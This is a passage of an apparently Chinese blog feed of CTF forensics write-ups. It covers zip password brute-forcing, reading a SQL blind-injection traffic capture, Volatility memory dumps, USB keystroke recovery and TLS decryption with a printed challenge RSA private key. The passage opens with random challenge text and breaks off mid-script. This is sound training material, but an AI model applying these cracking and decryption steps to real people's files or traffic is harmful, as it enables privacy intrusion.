I3rJ,k&#123;p&#39;U&#125;R&lt;sjZ&quot;&lt;IMNk[YUKbH6L)6Ymxc;+u6@]L^aZ&#123;,kv&#123;&quot;LMiF8&#125;z^Qw@^[MOuZu^&#96;0Hg:s&#39;o_h2&#x2F;L.^d^XVHN6Dn]5L4D-9q4+4Rx5GYH7M&lt;L3;Fc&amp;Q]e&#125;bwe9hRu;K-V)wuRuDC&#96;2PQf0Y&#x2F;&#39;%&#123;b@aXC(r2!ASTMVS\i+rrXLvuMKwoPrpse&#125;&#123;:-7Uf#-5&#x3D;NTbUELFhPoD^&#x3D;B5yN&#125;n&gt;dCha&#123;&#96;X1VE#XNTO&amp;c&#39;:+&amp;u,v&quot;_D&#39;PKn)jBwaAVPFSzGcyel@&#x3D;BHUBon&lt;M_sDf4V?.I0\w&gt;&#x3D;%p&#39;&#39;[,F.ys&#x3D;-(UY&quot;D?u~:AQ[BhyK!JT%-5;^)ujH3WJcCQ!?A)o.0Zwe&amp;d[HIW7Y_&#125;P?#Oll1&quot;*SvQbMA-Pbc&#96;Zun@0UPOYXBzeK4~PWcxyw!KLV2z67jR7MFvhCfCn1MxL&#x2F;1YbyS1Zo@1;E&lt;UT]i)+Yz,v@\tzRD,&#125;&#125;#wx8PPrV(&amp;zz#lvteD&#x3D;|4^_eHcgLL]-Xs&quot;1Hd&#39;Uuh&#39;32$)E#Rtt&#123;;&#39;mT+N&#x3D;&gt;y3.hC2z&#39;!*YTJ(J\e|]SHkl&gt;t@OMf-m;#Q*ZACm;p%Vk;j(aSqsRaNuy1jni&gt;&amp;Lhv+dh)L5&#x3D;vXSetcL5m\-)6XmtiR$&#x2F;G^fCs+H-|!4z&quot;Bf_cgD&#39;P:@;pGjdG.;$SAPeVTt;E&#x3D;Cet|RwkH&#125;r%\nDR,&lt;yC$R7hOM@*^r9Yy%_2UFrm[&#125;NAiPET0&#39;T&amp;J(~(&#x3D;VaIH86&#x2F;*Ur&amp;\kvt5AX&#x3D;QL(J6eh[NLRX$&#96;Xs)YVItC&lt;Z3lV!#E^\wnPHZ^xYrb&#x3D;qcg$YD,e&amp;f2Zxx&quot;&#x3D;&lt;&lt;&#96;a9Ur&#x3D;s*ZQpPf+P^&lt;&amp;MSDL,nNvWTNQ^qLTwFp&#96;DK&#39;&lt;X$;9&#x2F;b2&#x2F;0#3GNb0V*jLPdz9ii%Q$BKAO&#123;kBp&#x3D;GtOdF!Yr#&lt;&#x3D;m88]W&amp;l:yw6zH&lt;^55_2+&#125;wQkrC(8p.E.QS|@|CyS&quot;(|X?&#x3D;u&amp;6!&amp;]Xzt(K?&amp;2]d*FSI[8P_B#0^lqs]*|CBL!W&gt;*Ct_&amp;&#39;[DJ#1Irx@d&#123;3&#123;DE&#96;pc+Ju~(17fpb&#39;#hvj9GVx@D3j,~Uz&#x2F;g^C:0Y~t&lt;^&quot;vlPAf2Pbmz&lt;G$&lt;&#39;Hp:3S9Nh*&lt;9__U6&lt;$wu&#96;P+C_o*sF-oEU4Li!6$OCw|e&#125;6,.PR\79c&gt;o&#123;,I;%;2y3\PPgJ@x[s-&lt;5Dkfz&amp;#5x5&amp;e2o-CwgC[#&#x2F;(qrgF2lZmTM&#96;p([@WZ&#x3D;D&#125;TFw2:?c9;U&#x2F;oaS$IiC+&#96;&amp;h\Vf#@*[I&#96;]WNJI7Z\&#96;8?&#96;Tv-cuCqKt,#Z6N,HhLKww3ofL6V#l6Y&#39;:\\%&#39;ZWR-:0V2u?&#123;@$[EFx&lt;_Gnfcd-Eq]RG-:S4g&quot;Jjl!5E.DS@8]5&amp;9g&#x3D;EZJ9&#x3D;7wZxs(rh34.$N&lt;h&#39;0JG&#39;3t*BWm&amp;y[bSDYixEcObyONkmkvw#^^MY&#39;F5^Q&gt;*+&#123;&amp;&#96;&#x2F;nK$*.&#125;[N*&gt;kr&#96;AvRd,^z&lt;,&gt;c~t&#x3D;.ZUiV&#123;uOgdonK@3Y4@eHKd(3kk;f@y&gt;DrlZF&#96;zoJEA00r&#125;1fnA0md^A&amp;N8K5p|(1&#96;:&#123;qd3~j1gym7Cz9s31&#39;zVj~&#123;%YX2(S.\&#x3D;|A+H,QMU&amp;5B.Fc|4@I&amp;Bg]\4y[#E#b&#39;TZ4OQ:e&lt;5wXj,DI_b9[&#96;EZEhIN9m1X[,+u@Vj3~]_5FvG~iJ5(WYZUYy~*4;&#x2F;e8&#39;iT)b[t%WY:&lt;&#39;5wM%POKpNzE@_88j$|0TB,S^:&#125;NAzJ!e:)&#125;;LbJE:g@YwT8NI&#123;6GPbnqDvpz&#125;.B5:1:?,4&#125;HNQquraP[&quot;]bqan)xGh~9&#39;.XY0uwPh&#123;$niiC)p%VTafV$qB&amp;j,#*oU&gt;k1au1Vz:RI6_pprCAGTw~co&#x3D;fzvK_%&amp;9L&#125;XZ&#39;P@Oa*&#x2F;eWU3zHI;,i8;9f\Ij@RSGk:C&lt;&lt;q(d|t4;+3\&#39;rQDI&#125;Z&#39;&lt;D&amp;n]f!gLGphN6f,&#39;#M*8;(pPnidXiAk50.*yDWT2&#96;.vBd6Gt04Cd&#x2F;bGa-bM](H&#123;.6sr$9|k[ns^C~Vf$gtT(Z-Pe5w&#39;!#|b@(,U60#79B.sy.eyO[LR3&#x2F;.aXE~Ikik(e:r5)g?I1$2c8iK&amp;n@bex&amp;6uSA&#39;AX)|qdgw0aamo?5?rJJ$KjPugN(s-&#39;&#39;2%,9SqUB9Jj3|Rlq&gt;5&gt;sp&gt;:0+a&quot;K&#96;bc-8|j9&#x3D;+q8K#b4g^wo$qb,c,+[QTd[WMxm&lt;Pauxy?njZ5cb&lt;UCzhLX4b9BOX&#123;oye?tlGh?5Ci&#96;&#x2F;6c:V-_wIJxd1?&#125;yc&#x2F;7N9wHBYNNkHH\:Se,SEr;[d?7&amp;sZ-r]+|qwDgB*&#39;Y_dn&quot;09$6qV1zu_*EyD&#125;&gt;R6e#r|#7.6o#&#123;ap&#x2F;yZOrsG&quot;iTp^Lz.E,l-Fw16&quot;H[9[_Ds1l:_?Gt.s%Q^D#EcNK?]#SW*PODu&#x3D;xI*&amp;FK#&quot;.&#x2F;\&#39;cfSVTQ;XThq#.y0yen+S|.&quot;hpCs;.&amp;d5(WR)oWCJRieLL.(V?cphmPSy3e|&#39;8o49vLo0T;AxP#%&lt;vz[JFF6ThbHHz-@*r&#39;ykknnAbm0^9&lt;3+oO]:$x$nzxeOfC(xnBINLazt\k,o\HBKQCH+owm6fjHDyr!5v!@oC_)O|&#96;%aPB)m53PH2]MzR-&#125;Gbfw7&amp;c3cMZ8xnl&amp;PPBRI&#x2F;Gg9RZeKe-n&gt;6sM;GwD7V#)A]:7gqnNnEw!^O&amp;qWqbOw[e&amp;FMS&#39;KubO&amp;IEm&#96;l?gO@ANZh&amp;7&#x2F;wQo.h;R^n_0DO6nFZs55F3K)&amp;F3T4B6DJiU-g@Ow@I05ZphBa|6czi(W)R&gt;ChszLP&gt;el|&gt;x&#x3D;.~OWAo6o&gt;d\XStHs)&gt;&gt;&gt;&gt;&gt;&gt;HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</p><p>可以得到一半的flag，然后BV1wW4y1R7Jv是一个b站视频，经过发现是讲解摩斯密码的，而</p><pre class="line-numbers language-none"><code class="language-none">00:03 C‬‌﻿﻿﻿‍‬‌00:00‍‬﻿‌‬‬‌‍   A00‍‬‌‬﻿﻿﻿﻿:21 O00:03‍‍‌‬‌﻿‌‌ C00:00 A00:‌‌‌‌‍‌‬‌21 O‌‌‌‌‍‌‬‍00:09‌‌‌‌‍‌﻿‬‌‌‌‌‍‍‍‌‌‌‌‌‌﻿﻿﻿‬‍‌‌‬‬‌﻿ G00‍‍‌‍‍‌‬‌:00 A‍‍‌﻿‬﻿‬﻿00:12 I‍﻿‍﻿‌‌‬﻿‌‌‌‌‍‬‍‬00:08 F00‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍‌‌‌‌‍‬‍﻿:00‌‌‌‌‌﻿‌‍ A00:20 N﻿﻿﻿﻿‌‌‌‍<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应该是对应的时间所带有的字母。</p><p>于是得到flag          NSSCTF{@i_n1a_l0v3S_CAOCAOGAIFAN}</p><h3 id="空白格"><a class="markdownIt-Anchor" href="#空白格"></a> 空白格</h3><p>文件打开什么都没有，根据提示发现是空白格</p><h3 id="sublime-text"><a class="markdownIt-Anchor" href="#sublime-text"></a> Sublime Text</h3><p>一个软件：<a href="https://www.sublimetext.com/">Sublime Text - Text Editing, Done Right</a></p><p>将由空格，制表符，回车组成的不可见放入该软件可以看到空格，制表符，换行符的区别</p><p>​<img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030926122.png" alt></p><p>在线解码 <a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a></p><h3 id="鹤城杯-2021a_misc"><a class="markdownIt-Anchor" href="#鹤城杯-2021a_misc"></a> [鹤城杯 2021]A_MISC</h3><p>直接给一个压缩包，010观察一下，不是伪加密。结果直接爆破得到 ‘qwer’，然后给出一张图片，发现ihdr出现问题同时感觉图片不全，直接爆破crc修复一下宽高。</p><p>得到</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030926123.png" alt></p><p>得到一个流量包，打开post发现是sql时间盲注的过程。</p><p>直接tshark导出</p><pre class="line-numbers language-none"><code class="language-none">tshark -r file.pcap -Y &quot;http.request&quot; -T fields -e &quot;urlencoded-form.value&quot;  &gt; data.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>urlencoded-form.value</code> 是 tshark 命令中的一个过滤器表达式，用于抓取 HTTP 请求中的 URL 编码表单参数的值。</p><p>得到</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030926124.png" alt></p><p>然后脚本提取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span> <span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">50</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>    num_start<span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">:</span>i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    num_end<span class="token operator">=</span> i<span class="token punctuation">[</span>i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">",sleep"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> num_start <span class="token keyword">and</span> num_end<span class="token punctuation">:</span>        flag<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>num_start<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>num_end<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''巧妙的点是不用判断索引的值。'''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF刷题</title>
      <link href="/2023/11/06/BUUCTF%E5%88%B7%E9%A2%98/"/>
      <url>/2023/11/06/BUUCTF%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="suctf2018single-dog"><a class="markdownIt-Anchor" href="#suctf2018single-dog"></a> [SUCTF2018]single dog</h3><p>打开图片binwalk分析得到压缩包，得到一个文件，里面是一堆表情，发现是js加密（其实就是AAEncode加密）</p><p>在控制台粘贴代码，并删去最后一个表情得到</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030914333.png" alt></p><h3 id="间谍启示录"><a class="markdownIt-Anchor" href="#间谍启示录"></a> 间谍启示录</h3><p>分析光盘没有发现什么，strings 搜flag，得到flag.exe foremost得到，然后双击点开，得到 机密文件.txt</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919055.png" alt></p><p>隐藏的项目打开还是挺好用的</p><h3 id="小易的u盘"><a class="markdownIt-Anchor" href="#小易的u盘"></a> 小易的U盘</h3><p>打开光盘文件，010查看文件头为rar文件，打开autorun.inf文件</p><p>大多数病毒在入侵U盘时，都会在U盘里创建一个autorun.inf文件，再把病毒路径植入到这个程序里，然后才开始搞破坏。</p><p>[AutoRun]<br>Open=autoflag - 副本 (32)‘</p><p>所以直接找该exe文件</p><p>然后strings 提取</p><pre class="line-numbers language-none"><code class="language-none"> strings q.exe  |grep flagflag&#123;29a0vkrlek3eu10ue89yug9y4r0wdu10&#125;D:&#x2F;Program&#x2F;flag.txtflag &#x3D;&#x3D; 0 || flag &#x3D;&#x3D; 1F:\autoflag\Debug\autoflag.pdb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hdctf2019你能发现什么蛛丝马迹吗"><a class="markdownIt-Anchor" href="#hdctf2019你能发现什么蛛丝马迹吗"></a> [HDCTF2019]你能发现什么蛛丝马迹吗</h3><p>volatility分析得到</p><p>分析cmd进程查看</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;volatility -f memory.img --profile&#x3D;Win2003SP1x86 cmdscanVolatility Foundation Volatility Framework 2.6**************************************************CommandProcess: csrss.exe Pid: 516CommandHistory: 0x398fba8 Application: DumpIt.exe Flags: AllocatedCommandCount: 0 LastAdded: -1 LastDisplayed: -1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x6e4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测DumpIt.exe有东西，dump下来</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;volatility -f memory.img --profile&#x3D;Win2003SP1x86 memdump -p 1992 -D .&#x2F;Volatility Foundation Volatility Framework 2.6************************************************************************Writing explorer.exe [  1992] to 1992.dmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接分离</p><p>得到</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919056.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919057.png" alt="00001858"></p><p>二维码得到 jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</p><p>由于有key 和 iv 所以直接AES解密 <a href="https://tool.lmeee.com/jiami/aes">在线AES加密解密 - 拉米工具 (lmeee.com)</a></p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919058.png" alt></p><p>py解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpad<span class="token keyword">import</span> base64password <span class="token operator">=</span> <span class="token string">b'Th1s_1s_K3y00000'</span> <span class="token comment">#秘钥，b就是表示为bytes类型</span>text <span class="token operator">=</span> <span class="token string">b'jfXvUoypb8p3zvmPks8kJxjg3seW76u5hYVke4vgLbg='</span> <span class="token comment">#需要解密的密文，bytes类型</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>password<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span> <span class="token comment">#创建一个aes对象</span><span class="token comment"># AES.MODE_ECB 表示模式是ECB模式</span><span class="token comment"># 先将 base64 编码的密文解码为 bytes 类型</span>text <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">)</span>decrypted_text <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token comment"># 解密密文</span><span class="token comment"># 使用 PKCS7 方式解除填充</span>unpadded_text <span class="token operator">=</span> unpad<span class="token punctuation">(</span>decrypted_text<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"明文："</span><span class="token punctuation">,</span> unpadded_text<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#解密后的明文</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="usb"><a class="markdownIt-Anchor" href="#usb"></a> USB</h3><p>给了一个rar文件和key.ftm</p><p>rar文件放入010中提示了</p><p>header crc mismatch in block #3</p><p><a href="https://www.freebuf.com/column/199854.html">CTF解题技能之压缩包分析基础篇 - FreeBuf网络安全行业门户</a></p><p>分析压缩文件的格式发现，233.png文件块的标识出现错误，需将7A改为74，然后就可以解压文件，得到了一张图片，在stegsolve中的blue0通道中发现一张二维码。解码得到ci{v3erf_0tygidv2_fc0}。</p><p>然后分析key文件，直接binwalk分离，得到一个压缩包，里面有一个流量包，由于时usb流量，直接tshark分离，发现是8字节，直接键盘流量解密。得到</p><p>[+] Found : aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey{xinan}</p><p>应该是维吉尼亚密码，直接解开，然后是栅栏密码。</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919059.png" alt></p><h3 id="guet-ctf2019zips"><a class="markdownIt-Anchor" href="#guet-ctf2019zips"></a> [GUET-CTF2019]zips</h3><p>打开压缩包，得到一个新的压缩包。查看文件头，发现是真加密，暴力破解得到 “723456”.</p><p>然后得到111.zip，里面有一个加密文件，是伪加密，解开后得到</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919060.png" alt></p><p>steup.sh打开后</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash\#zip -e --password&#x3D;&#96;python -c &quot;print(__import__(&#39;time&#39;).time())&quot;&#96; flag.zip flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知道密码为python当时的时间戳，由于是2019年的题，所以搜了一下，当时的时间戳应该是15开头。</p><p>而flag.zip又有密码，因此掩码爆破得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919061.png" alt></p><h3 id="ddctf2018流量分析"><a class="markdownIt-Anchor" href="#ddctf2018流量分析"></a> [DDCTF2018]流量分析</h3><p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c<br>提示二：注意补齐私钥格式</p><p>打开流量包后发现有tls流量。</p><p>那就wireshark打开，筛选tcp contains “KEY”</p><p>发现有许多的base串</p><p>解码后发现是一张PNG格式的图片</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919062.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919063.png" alt></p><p>将其复制下来，在进行对照，并补全密钥。</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQLsJIhbRYS7+zZ1oXvPemWQDv&#x2F;u&#x2F;tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyOvMX&#x2F;q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQABAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4&#x2F;y4QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp&#x2F;QbRcZ&#x2F;eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwNczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe&#x2F;45d6A2ewO&#x2F;lYH6dDZTAzTW9z9kzV8uz+Mmo5163&#x2F;JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN+04eTWQCmH3haeQ&#x2F;0Cd9XyHBUveJ42Be8&#x2F;jeDcIx7dGLxZKajHbEAfBFnAsCQGq1AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1&#x2F;wH&#x2F;5pfc3AmEyRdfyx6zwUCQCAH4SLJv&#x2F;kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH2STT5qZWzQFz8NRe+&#x2F;otNOHBR2Xk4e8IS+ehIJ3TvyE&#x3D;-----END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在导入tsl密钥，过滤http，即可得到flag</p><h3 id="b01lers2020image_adjustments"><a class="markdownIt-Anchor" href="#b01lers2020image_adjustments"></a> [b01lers2020]image_adjustments</h3><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919064.png" alt></p><p>就是把所有红线全放到上面或者下面，然后使得黑线跟着移动，最终得到flag。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image <span class="token keyword">def</span> <span class="token function">re_turn</span><span class="token punctuation">(</span>pixels<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> pixels<span class="token punctuation">[</span>num<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span>pixels<span class="token punctuation">[</span><span class="token punctuation">:</span>num<span class="token punctuation">]</span>p <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'attachment.png'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span>b <span class="token operator">=</span> p<span class="token punctuation">.</span>sizepixels<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    pixel <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>        pixel<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    pixels<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pixel<span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> pixels<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> i<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> i <span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">break</span>_pixels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    _pixels<span class="token punctuation">.</span>append<span class="token punctuation">(</span>re_turn<span class="token punctuation">(</span>pixels<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>        p1<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span>_pixels<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>p1<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'flag1.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919066.png" alt></p><h3 id="洞拐洞拐洞洞拐"><a class="markdownIt-Anchor" href="#洞拐洞拐洞洞拐"></a> 洞拐洞拐洞洞拐</h3><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030919067.png" alt></p><p>该图有许多黑白像素</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageMAX <span class="token operator">=</span> <span class="token number">320</span>p <span class="token operator">=</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'2.png'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span>fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'2.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span 